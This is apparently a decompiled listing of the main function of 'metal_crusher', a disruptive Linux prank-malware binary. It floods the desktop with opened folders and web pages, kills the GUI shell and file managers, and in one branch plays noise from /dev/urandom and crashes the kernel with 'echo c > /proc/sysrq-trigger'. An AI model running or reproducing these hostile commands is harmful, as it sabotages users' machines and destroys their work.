
  int64_t metal_crusher::main::h9727646a2bcbc8e1()

{
    int128_t var_268;
    std::env::args::h94b742ddbe085465(&var_268);
    void var_148;
    core::iter::traits::iterator::Iterator::collect::h72b4ec0362567ca5(&var_148, &var_268);
    _$LT$T$u20$as$u20$alloc..slice..$LT$impl$u20$$u5b$T$u5d$$GT$..to_vec_in..ConvertVec$GT$::to_vec::hc831021ef339ddb2(&var_268);
    int64_t var_258;
    int64_t var_1e8 = var_258;
    int128_t var_1f8 = var_268;
    int32_t var_f8;
    core::result::Result$LT$T$C$E$GT$::unwrap::h55000a11ecaa97f2(&var_f8, &var_1f8);
    int64_t var_140;
    int64_t var_138;
    
    if (!_$LT$T$u20$as$u20$core..slice..cmp..SliceContains$GT$::slice_contains::hf85221c3aca31123(
        &var_f8, var_140, var_138))
    {
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(&var_f8);
        int64_t var_1a8_1 = -0x8000000000000000;
        int64_t var_1b8 = 0;
        char var_190_1 = 0;
        int64_t var_198;
        int64_t var_248_1 = var_198;
        char var_240_1 = 0;
        int32_t var_18f;
        int32_t var_23f_1 = var_18f;
        int16_t var_18b;
        int16_t var_23b_1 = var_18b;
        char var_189;
        char var_239_1 = var_189;
        int64_t var_258_1 = var_1a8_1;
        int64_t var_1a0;
        int64_t var_250_1 = var_1a0;
        var_268 = var_1b8;
        std::thread::Builder::spawn_unchecked::h1ce4ae56c7065926(&var_1f8, &var_268);
        core::result::Result$LT$T$C$E$GT$::expect::h0f618ee5425b50ac(&var_268, &var_1f8);
        core::ptr::drop_in_place$LT$std..thread..JoinHandle$LT$$LP$$RP$$GT$$GT$::ha4837b2075f310b9(
            &var_268);
        metal_crusher::music::play_audio::h7324776fa7dd087f();
        metal_crusher::fun::notify::hb8b2a52834cecaca();
        std::thread::sleep::h8814a255f2a81ecc(1, 0);
        metal_crusher::fun::notify::hb8b2a52834cecaca();
        std::thread::sleep::h8814a255f2a81ecc(0, 0x17d78400);
        char* rax_8;
        int64_t rdx_3;
        rax_8 = metal_crusher::fun::detect_terminal::hbf6d36db98f6afb5();
        char* var_208 = rax_8;
        int64_t var_200_1 = rdx_3;
        std::thread::sleep::h8814a255f2a81ecc(2, 0x11e1a300);
        int64_t r12;
        r12 = 1;
        char const* const var_258_9;
        char const* const var_248_7;
        
        while (true)
        {
            var_268 = "xdg-open /xdg-open /binxdg-open …";
            *var_268[8] = 0xa;
            char const* const var_258_2 = "xdg-open /binxdg-open /libxdg-op…";
            int64_t var_250_2 = 0xd;
            char const* const var_248_2 = "xdg-open /libxdg-open /homexdg-o…";
            var_240_1 = 0xd;
            char const* const var_238_1 = "xdg-open /homexdg-open /tmpls /t…";
            int64_t var_230_1 = 0xe;
            char const* const var_228_1 = "xdg-open /tmpls /tmp; sleep 2000…";
            int64_t var_220_1 = 0xd;
            int64_t var_218_1 = 0;
            int64_t var_210_1 = 5;
            
            while (true)
            {
                int64_t rax_9;
                int64_t rdx_4;
                rax_9 = _$LT$core..array..iter..IntoIter$LT$T$C$_$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h5fe64c1c96c56c1e(&var_268);
                
                if (!rax_9)
                    break;
                
                metal_crusher::fun::execute_shell::h41804e4a8d918ef1(rax_9);
                std::thread::sleep::h8814a255f2a81ecc(0, 0x23c34600);
            }
            
            core::ptr::drop_in_place$LT$core..array..iter..IntoIter$LT$$RF$str$C$5_usize$GT$$GT$::hee509b89839ede61();
            var_268 = "ls /; sleep 2000";
            *var_268[8] = 0x10;
            char const* const var_258_3 = "ls /tmp; sleep 2000ls /bin; slee…";
            int64_t var_250_3 = 0x13;
            char const* const var_248_3 = "ls /bin; sleep 2000ls /usr; slee…";
            var_240_1 = 0x13;
            char const* const var_238_2 = "ls /usr; sleep 2000ls /etc; slee…";
            int64_t var_230_2 = 0x13;
            char const* const var_228_2 = "ls /etc; sleep 2000xdg-open /dev…";
            int64_t var_220_2 = 0x13;
            int64_t var_218_2 = 0;
            int64_t var_210_2 = 5;
            
            while (true)
            {
                int64_t rax_10;
                int64_t rdx_5;
                rax_10 = _$LT$core..array..iter..IntoIter$LT$T$C$_$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h5fe64c1c96c56c1e(&var_268);
                
                if (!rax_10)
                    break;
                
                metal_crusher::fun::run_in_terminal::hb55afbf220dc8f24(var_208);
                std::thread::sleep::h8814a255f2a81ecc(0, 0x23c34600);
            }
            
            core::ptr::drop_in_place$LT$core..array..iter..IntoIter$LT$$RF$str$C$5_usize$GT$$GT$::hee509b89839ede61();
            metal_crusher::fun::destroy_gui_shell::h1e3240fbf7d5db6f();
            metal_crusher::fun::destroy_file_managers::h119efdf6252da426();
            var_1f8 = &var_208;
            *var_1f8[8] = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h0847ff0da4c1d6d7;
            var_268 = &data_997680;
            *var_268[8] = 1;
            int64_t var_248_4 = 0;
            int128_t* var_258_4 = &var_1f8;
            int64_t var_250_4 = 1;
            int128_t var_c8;
            core::option::Option$LT$T$GT$::map_or_else::h1648c532ac184ddc(&var_c8, &var_268);
            var_268 = var_c8;
            int64_t var_b8;
            int64_t var_258_5 = var_b8;
            metal_crusher::fun::execute_shell::h41804e4a8d918ef1(*var_268[8]);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(&var_268);
            std::thread::sleep::h8814a255f2a81ecc(1, 0xbebc200);
            metal_crusher::fun::reanimate_gui_shell::h0e56d731a5a95ba2();
            var_268 = "xdg-open /devxdg-open /sbinxdg-o…";
            *var_268[8] = 0xd;
            char const* const var_258_6 = "xdg-open /sbinxdg-open /runxdg-o…";
            int64_t var_250_5 = 0xe;
            char const* const var_248_5 = "xdg-open /runxdg-open /sysxdg-op…";
            var_240_1 = 0xd;
            char const* const var_238_3 = "xdg-open /sysxdg-open /proctree …";
            int64_t var_230_3 = 0xd;
            char const* const var_228_3 = "xdg-open /proctree /home; sleep …";
            int64_t var_220_3 = 0xe;
            int64_t var_218_3 = 0;
            int64_t var_210_3 = 5;
            
            while (true)
            {
                int64_t rax_11;
                int64_t rdx_7;
                rax_11 = _$LT$core..array..iter..IntoIter$LT$T$C$_$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h5fe64c1c96c56c1e(&var_268);
                
                if (!rax_11)
                    break;
                
                metal_crusher::fun::execute_shell::h41804e4a8d918ef1(rax_11);
                std::thread::sleep::h8814a255f2a81ecc(0, 0x23c34600);
            }
            
            core::ptr::drop_in_place$LT$core..array..iter..IntoIter$LT$$RF$str$C$5_usize$GT$$GT$::hee509b89839ede61();
            metal_crusher::fun::run_in_terminal::hb55afbf220dc8f24(var_208);
            std::thread::sleep::h8814a255f2a81ecc(0, 0x23c34600);
            int32_t rbx_1 = 4;
            
            while (true)
            {
                int32_t temp0_1 = rbx_1;
                rbx_1 -= 1;
                
                if (temp0_1 == 1)
                    break;
                
                metal_crusher::fun::run_in_terminal::hb55afbf220dc8f24(var_208);
                std::thread::sleep::h8814a255f2a81ecc(0, 0x23c34600);
            }
            
            var_1f8 = &var_208;
            *var_1f8[8] = _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h0847ff0da4c1d6d7;
            var_268 = &data_997680;
            *var_268[8] = 1;
            int64_t var_248_6 = 0;
            int128_t* var_258_7 = &var_1f8;
            int64_t var_250_6 = 1;
            int128_t var_b0;
            core::option::Option$LT$T$GT$::map_or_else::h1648c532ac184ddc(&var_b0, &var_268);
            var_268 = var_b0;
            int64_t var_a0;
            int64_t var_258_8 = var_a0;
            metal_crusher::fun::execute_shell::h41804e4a8d918ef1(*var_268[8]);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(&var_268);
            std::thread::sleep::h8814a255f2a81ecc(1, 0xbebc200);
            metal_crusher::fun::destroy_file_managers::h119efdf6252da426();
            std::thread::sleep::h8814a255f2a81ecc(2, 0);
            metal_crusher::fun::toggle_desktop_overview::h76fcc1b69c9cf37e();
            metal_crusher::fun::put_random_shit_on_desktop::h71399300085ae3fd();
            metal_crusher::fun::toggle_desktop_overview::h76fcc1b69c9cf37e();
            var_268 = "xdg-open https://www.youtube.com…";
            *var_268[8] = 0x28;
            var_258_9 = "xdg-open https://www.google.com/…";
            int64_t var_250_7 = 0x2e;
            var_248_7 = "xdg-open https://2ip.ioxdg-open …";
            var_240_1 = 0x17;
            char const* const var_238_4 = "xdg-open https://github.com/rela…";
            int64_t var_230_4 = 0x38;
            char const* const var_228_4 = "xdg-open https://www.newgrounds.…";
            int64_t var_220_4 = 0x38;
            int64_t var_218_4 = 0;
            int64_t var_210_4 = 5;
            
            while (true)
            {
                int64_t rax_12;
                int64_t rdx_10;
                rax_12 = _$LT$core..array..iter..IntoIter$LT$T$C$_$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h5fe64c1c96c56c1e(&var_268);
                
                if (!rax_12)
                    break;
                
                metal_crusher::fun::execute_shell::h41804e4a8d918ef1(rax_12);
                metal_crusher::fun::execute_shell::h41804e4a8d918ef1(1);
                std::thread::sleep::h8814a255f2a81ecc(1, 0x1dcd6500);
            }
            
            core::ptr::drop_in_place$LT$core..array..iter..IntoIter$LT$$RF$str$C$5_usize$GT$$GT$::hee509b89839ede61();
            std::thread::sleep::h8814a255f2a81ecc(0, 0x1dcd6500);
            int32_t rbx_2 = 8;
            
            while (true)
            {
                int32_t temp1_1 = rbx_2;
                rbx_2 -= 1;
                
                if (temp1_1 == 1)
                    break;
                
                std::thread::sleep::h8814a255f2a81ecc(0, 0xbebc200);
                metal_crusher::fun::toggle_desktop_overview::h76fcc1b69c9cf37e();
            }
            
            if (!(r12 & 1))
                break;
            
            r12 = 0;
            std::thread::sleep::h8814a255f2a81ecc(3, 0x1dcd6500);
        }
        
        std::env::var::hfb15700640056880(&var_268, &data_43010c[8]);
        void var_98;
        core::result::Result$LT$T$C$E$GT$::unwrap::hf281b12ef98186e8(&var_98, &var_268);
        var_248_7 = var_198;
        var_258_9 = var_1a8_1;
        var_268 = var_1b8;
        std::thread::Builder::spawn_unchecked::ha2ddb01914461b9d(&var_1f8, &var_268);
        core::result::Result$LT$T$C$E$GT$::expect::h0f618ee5425b50ac(&var_268, &var_1f8);
        core::ptr::drop_in_place$LT$std..thread..JoinHandle$LT$$LP$$RP$$GT$$GT$::ha4837b2075f310b9(
            &var_268);
        std::thread::Builder::spawn_unchecked::heb2ac1b7f718bfa5(&var_268, &var_1b8);
        core::result::Result$LT$T$C$E$GT$::expect::h0f618ee5425b50ac(&var_1f8, &var_268);
        core::ptr::drop_in_place$LT$std..thread..JoinHandle$LT$$LP$$RP$$GT$$GT$::ha4837b2075f310b9(
            &var_1f8);
        var_1f8 = &var_98;
        *var_1f8[8] =
            _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h93175f2dbdefd6b2;
        var_268 = &data_997690;
        *var_268[8] = 1;
        int64_t var_248_8 = 0;
        int128_t* var_258_10 = &var_1f8;
        int64_t var_250_8 = 1;
        void var_48;
        core::option::Option$LT$T$GT$::map_or_else::h1648c532ac184ddc(&var_48, &var_268);
        std::fs::read_dir::h89149955dc944fa3(&var_268, &var_48);
        int64_t rax_13;
        char rdx_13;
        rax_13 = core::result::Result$LT$T$C$E$GT$::unwrap::hb31effbf8bc15b97(var_268, *var_268[8]);
        int64_t var_1c8 = rax_13;
        char var_1c0_1 = rdx_13 & 1;
        
        while (true)
        {
            _$LT$std..fs..ReadDir$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h4e712d0990114342(&var_f8, &var_1c8);
            
            if (var_f8 != 1)
                break;
            
            void var_120;
            void var_f0;
            core::result::Result$LT$T$C$E$GT$::unwrap::h490d13a838f57c0c(&var_120, &var_f0);
            std::fs::DirEntry::file_type::hefeddcb43cb060f5(&var_268, &var_120);
            
            if ((core::result::Result$LT$T$C$E$GT$::unwrap::h5c47582f0e8716ec(&var_268) & 0xf000)
                == 0x4000)
            {
                std::fs::DirEntry::path::hab67f89e376a9076(&var_1f8, &var_120);
                int128_t var_160 = var_1f8;
                int128_t* var_188 = &var_160;
                uint64_t (* var_180_1)(int64_t* arg1, int64_t arg2) = _$LT$std..path..Display$u20$as$u20$core..fmt..Display$GT$::fmt::h20adf00188ba8439;
                var_268 = &data_9976a0;
                *var_268[8] = 1;
                int64_t var_248_9 = 0;
                int128_t** var_258_11 = &var_188;
                int64_t var_250_9 = 1;
                int128_t var_80;
                core::option::Option$LT$T$GT$::map_or_else::h1648c532ac184ddc(&var_80, &var_268);
                core::ptr::drop_in_place$LT$std..path..PathBuf$GT$::h3d4a59f8b713a426(&var_1f8);
                var_268 = var_80;
                int64_t var_70;
                int64_t var_258_12 = var_70;
                metal_crusher::fun::execute_shell::h41804e4a8d918ef1(*var_268[8]);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(&var_268);
                std::fs::DirEntry::path::hab67f89e376a9076(&var_268, &var_120);
                std::fs::read_dir::hf78a92d2a9764b00(&var_1f8, &var_268);
                int64_t rax_16;
                char rdx_15;
                rax_16 = core::result::Result$LT$T$C$E$GT$::unwrap::hb31effbf8bc15b97(var_1f8, 
                    *var_1f8[8]);
                int64_t var_170 = rax_16;
                char var_168_1 = rdx_15 & 1;
                
                while (true)
                {
                    _$LT$std..fs..ReadDir$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h4e712d0990114342(&var_1f8, &var_170);
                    
                    if (var_1f8 != 1)
                        break;
                    
                    core::result::Result$LT$T$C$E$GT$::unwrap::h490d13a838f57c0c(&var_80, 
                        &*var_1f8[8]);
                    std::fs::DirEntry::file_type::hefeddcb43cb060f5(&var_268, &var_80);
                    
                    if ((core::result::Result$LT$T$C$E$GT$::unwrap::h5c47582f0e8716ec(&var_268)
                        & 0xf000) == 0x4000)
                    {
                        std::fs::DirEntry::path::hab67f89e376a9076(&var_160, &var_80);
                        int128_t var_58 = var_160;
                        int128_t* var_130 = &var_58;
                        uint64_t (* var_128_1)(int64_t* arg1, int64_t arg2) = _$LT$std..path..Display$u20$as$u20$core..fmt..Display$GT$::fmt::h20adf00188ba8439;
                        var_268 = &data_9976a0;
                        *var_268[8] = 1;
                        int64_t var_248_10 = 0;
                        int128_t** var_258_13 = &var_130;
                        int64_t var_250_10 = 1;
                        core::option::Option$LT$T$GT$::map_or_else::h1648c532ac184ddc(&var_188, 
                            &var_268);
                        core::ptr::drop_in_place$LT$std..path..PathBuf$GT$::h3d4a59f8b713a426(
                            &var_160);
                        var_268 = var_188;
                        int64_t var_178;
                        int64_t var_258_14 = var_178;
                        metal_crusher::fun::execute_shell::h41804e4a8d918ef1(*var_268[8]);
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(
                            &var_268);
                        std::thread::sleep::h8814a255f2a81ecc(0, 0x17d78400);
                        metal_crusher::fun::toggle_desktop_overview::h76fcc1b69c9cf37e();
                    }
                    
                    core::ptr::drop_in_place$LT$std..fs..DirEntry$GT$::h783082bf94872fe1(&var_80);
                }
                
                core::ptr::drop_in_place$LT$std..fs..ReadDir$GT$::h571b6ef1f796f6ca(&var_170);
                metal_crusher::fun::toggle_desktop_overview::h76fcc1b69c9cf37e();
                std::thread::sleep::h8814a255f2a81ecc(0, 0x17d78400);
            }
            
            core::ptr::drop_in_place$LT$std..fs..DirEntry$GT$::h783082bf94872fe1(&var_120);
        }
        
        core::ptr::drop_in_place$LT$std..fs..ReadDir$GT$::h571b6ef1f796f6ca(&var_1c8);
        std::thread::sleep::h8814a255f2a81ecc(0x28, 0);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(&var_98);
    }
    else
    {
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha04b33545db7d743(&var_f8);
        std::thread::sleep::h8814a255f2a81ecc(0x6c, 0);
        metal_crusher::fun::execute_shell::h41804e4a8d918ef1("cat /dev/urandom | aplayecho c >…");
        std::thread::sleep::h8814a255f2a81ecc(1, 0);
        metal_crusher::fun::execute_shell::h41804e4a8d918ef1("echo c > /proc/sysrq-trigger");
    }
    
    return core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h42b994d15418b73d(&var_148);
}
